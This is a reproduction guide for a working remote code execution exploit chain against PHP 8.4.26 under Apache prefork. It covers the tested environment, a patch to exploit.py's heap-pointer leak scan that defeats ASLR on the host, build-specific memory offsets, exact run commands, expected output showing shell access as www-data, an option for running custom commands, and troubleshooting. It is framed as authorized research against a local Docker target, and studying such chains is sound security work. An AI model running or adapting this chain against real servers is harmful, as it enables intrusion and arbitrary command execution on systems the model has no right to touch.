# Reproducing the one-shot RCE (validated setup)

This note records the **exact environment** the pure-HTTP chain
(`exploit.py`) was reproduced on, the one change that was needed to make it
land here, and the precise steps to reproduce the result.

> Authorized vulnerability research / reproduction only.

## 1. Validated environment

| Component | Value |
|---|---|
| Host OS | Ubuntu 22.04.5 LTS |
| Host kernel | `6.8.0-1070-azure` |
| Arch | `x86_64` |
| `kernel.randomize_va_space` | `2` (full ASLR) |
| Docker | `29.9.2` |
| Python (attacker) | `3.10.12` |
| Target image | `php:8.4.26-apache` |
| Target image digest | `sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a` |
| Target PHP | `8.4.26` NTS, mod_php |
| Target Apache | `2.4.69` (Debian), prefork |
| Target page | `docker/www/index.php` = `<?php echo "OK\n"; ?>` |

Target `php.ini` is the stock `php.ini-production` copied verbatim by
`pure/run_pure.sh`; no custom ini, no target-side files:

```
display_errors         => Off
memory_limit           => 128M
post_max_size          => 8M
output_buffering        => 0
max_file_uploads       => 20
max_input_vars         => 1000
max_multipart_body_parts => -1
session.save_path      => (none)
session.sid_length     => 32
session.use_strict_mode => Off
```

MPM (stock official prefork):

```
StartServers           5
MinSpareServers        5
MaxSpareServers        10
MaxRequestWorkers      150
MaxConnectionsPerChild 0
```

## 2. The one change needed on this host

The chain fired correctly out of the box (A1 OOM → `500`; B1 OOB read →
`decoded=819208`, `zval_ptr_dtor` present 1095×). The only failure was in
`parse_leak()` in `exploit.py`, which scanned the leaked window for heap
pointers with a hardcoded top-byte range:

```python
if 0x7f0000000000 <= q <= 0x7fffffffffff:   # original
```

On this host the kernel's `mmap_base` ASLR maps libraries **below**
`0x7f0000000000` — observed bases across runs: `0x77b5…`, `0x7a5c…`,
`0x7836…`. Every real pointer was therefore discarded, producing
`no heap pointers in leak window`. The fix widens the lower bound to the
canonical x86-64 lower-half mmap region:

```python
if 0x100000000000 <= q <= 0x7fffffffffff:   # fixed
```

This captures `0x55/0x77/0x7a/0x7f…` bases while still excluding the
`0x4141…`, `0xffff…`, nested-array ASCII (`[a][a]…`), and small-integer
noise in the window. No offsets changed — all stage-3 offsets
(`libphp+0x65EB60`, `libphp+0x465370`, `main+0xF8398`, `main+0x7D720`) are
relative and build-specific to the image digest above.

## 3. Prerequisites

Docker must be usable by your user. On this box the account was not in the
`docker` group, so this was run once (needs your password, in a normal
terminal):

```bash
sudo usermod -aG docker "$USER"
```

Then start a **fresh login shell** (or `newgrp docker`) so the group takes
effect. Verify:

```bash
docker ps        # should not say "permission denied"
```

If you cannot join the `docker` group, prefix docker invocations with
`sudo` and pass `--docker "sudo docker"` to `exploit.py` for the
`--restart` path (requires password-capable sudo).

## 4. Reproduce

```bash
cd php2shell-bypass-aslr-exp

# 1) Start the stock target (official image + stock php.ini-production,
#    official prefork, MaxRequestWorkers=150). Prints the live ini + MPM.
./pure/run_pure.sh
#   target: OK
#   PHP 8.4.26 ...
#   display_errors => Off => Off
#   memory_limit => 128M => 128M
#   workers: official (run exploit with --workers 150)

# 2) One command: A1 -> B1 (leak libphp + main chunk) -> A2 -> B2 -> id
python3 exploit.py --port 18110
```

### Expected output

```
      pinned 150/150 workers (149 holders)
[try 1] A1: END-cleanup send_cookie OOM
[try 1] B1: stale-id OOB read (chunk base + libphp)
      decoded=819208 zval_ptr_dtor=0x7836e9eacb60 -> libphp=0x7836e984e000
      chunk buckets: [('0x7836e7...', 7495), ('0x7836e9...', 1095),
                      ('0x7836e7...', 87), ('0x7836e6...', 79), ...]
[try 1] A2 + B2: main=0x7836e7800000 S=0x7836e78f8398 zif_system=0x7836e9d13370
[4/4] RCE OK; proof .../out/p1:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The absolute addresses differ every run (ASLR); the **fingerprint** is
stable and is what confirms a good leak:

- `decoded=819208`
- `zval_ptr_dtor` count `1095`
- chunk buckets `[ id:7495, libphp:1095, main:87, neighbor:79 ]`
- `libphp - main` delta in `0x1A00000..0x1F00000`

## 5. Reliability observed on this host

Full-chain RCE, all on `[try 1]`, across different ASLR bases:

| Run | How | ASLR libphp base | Result |
|---|---|---|---|
| 1 | fresh container | `0x7a5cb556d000` | `uid=33(www-data)` |
| 2 | same container, no restart | `0x7a5cb556d000` | `uid=33(www-data)` |
| 3 | `docker restart` (fresh ASLR) | `0x7836e984e000` | `uid=33(www-data)` |
| 4 | first run after fix | `0x7a5cb5…` | `uid=33(www-data)` |

A fixed child is pinned by holding `MaxRequestWorkers-1 = 149` partial POST
bodies open; it is not restarted by the chain and the target ini is never
modified.

## 6. Useful variations

```bash
# Fresh ASLR each time (restart the container first)
docker restart p2s-pure-18110 && python3 exploit.py --port 18110
# or let the script do it (needs docker without sudo, or --docker "sudo docker"):
python3 exploit.py --port 18110 --restart p2s-pure-18110 --docker docker

# Single-worker lab baseline
./pure/run_pure.sh --single
python3 exploit.py --port 18110 --workers 1

# Custom command (proof file is written inside the container at /out/p1,
# mounted to ./out):
printf 'id; uname -a > /out/p1\n' > out/c
python3 exploit.py --port 18110 --cmd 'sh</out/c'
```

## 7. Troubleshooting

- **`no heap pointers in leak window`** — the leak scan rejected every
  pointer. On a host whose ASLR base falls outside the scan range this is
  the symptom fixed in §2; confirm `parse_leak()` uses the widened bound.
- **`no Set-Cookie in leak response (0 bytes)`** — the pinned child
  returned nothing (it crashed or the chain hit a different child). Retry;
  the script already retries `--retries` (default 3) times, each a full
  fresh A1+B1.
- **`implausible libphp-main delta`** — the most-common pointer in the
  window was not `zval_ptr_dtor` this round; the script discards the leak
  and re-runs the chain. Rare.
- **Everything fails on a long-running container** — restart it for a clean
  worker pool and run again.
